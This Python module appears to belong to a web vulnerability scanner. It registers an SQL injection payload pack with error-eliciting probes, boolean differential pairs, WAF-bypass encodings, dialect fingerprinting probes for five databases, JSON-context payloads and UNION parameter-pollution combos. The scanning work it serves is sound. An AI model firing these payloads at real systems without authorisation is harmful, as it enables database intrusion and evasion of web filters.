from ..payloads import PayloadPack, register


T1_CHEAP = [
    "'",
    "'-- -",
    "')-- -",
    "1' ORDER BY 1-- -",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND 1=1-- -",
    "1' AND 1=2-- -",
    "`-- -",
    "||'abc'",
    "1' AND '1'='1",
    "1' AND '1'='2",
]

T2_WAF_BYPASS = [
    "1 UNI/**/ON SEL/**/ECT NULL-- -",
    "/*!50000UNION*/ /*!50000SELECT*/ NULL-- -",
    "1%09AND%091=1",
    "1%0aAND%0a1=2",
    "1%0bAND%0b1=1",
    "1%0cAND%0c1=2",
    "1%0dAND%0d1=1",
    "1%20AND%201=1",
    "1/**/AND/**/1=1",
    "1%2527%2520AND%25201=1",
    "1e1AND 1=1",
    "1e0AND 1=2",
    "1 AND 'str'='str'",
    "1 AND 'str'='str2'",
    "%27",
    "%2527",
]

T3_DIALECT_ELICITORS = [
    "1/convert(int,1)",
    "1::int",
    "1 div 1",
    "1/0",
]

JSON_CONTEXT = [
    "' and json_extract('{}','$')='",
    "' and json_valid('{}')-- -",
    "' and json_extract('{\"a\":1}','$.a')=1-- -",
]

HPP_COMBOS = [
    ("sqlite_union", "1", "2 UNION SELECT NULL-- -"),
    ("mysql_union", "1", "2 UNION SELECT NULL,NULL-- -"),
    ("mssql_union", "1", "2 UNION SELECT NULL,NULL,NULL-- -"),
    ("postgres_bool", "1", "1 AND 1=1-- -"),
]

EXPECTED_SIGNAL = {}
for _p in T1_CHEAP:
    EXPECTED_SIGNAL[_p] = {"kind": "error_or_differential", "verdict": "VULNERABLE"}
for _p in T2_WAF_BYPASS:
    EXPECTED_SIGNAL[_p] = {"kind": "waf_bypass_probe", "verdict": "SUSPICIOUS"}
for _p in T3_DIALECT_ELICITORS:
    EXPECTED_SIGNAL[_p] = {"kind": "dialect_elicitor", "verdict": "VULNERABLE"}
for _p in JSON_CONTEXT:
    EXPECTED_SIGNAL[_p] = {"kind": "json_context", "verdict": "VULNERABLE"}

PACK = PayloadPack(
    id="sqli",
    family="sqli",
    waf_safe=T1_CHEAP,
    waf_bypass=T2_WAF_BYPASS,
    context_variants={"json": JSON_CONTEXT, "dialect": T3_DIALECT_ELICITORS},
    decoder_chain=["url_single", "url_double", "comment_insert"],
    expected_signal=EXPECTED_SIGNAL,
)
register(PACK)

DIFFERENTIAL_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 1=1-- -", "1' AND 1=2-- -"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 'a'='a'", "1 AND 'a'='b'"),
]

UNION_MARKER = "SC_SQLI_UNION_9933"

DIALECT_PROBES = {
    "mssql": ["1/convert(int,1)", "1; WAITFOR DELAY '0:0:0'--"],
    "postgres": ["1::int", "1::text"],
    "mysql": ["1 div 1", "1 BENCHMARK(1,1)"],
    "oracle": ["1/0", "1 FROM DUAL"],
    "sqlite": ["1||1", "1 GLOB 'a'"],
}

JSON_PAYLOADS = JSON_CONTEXT
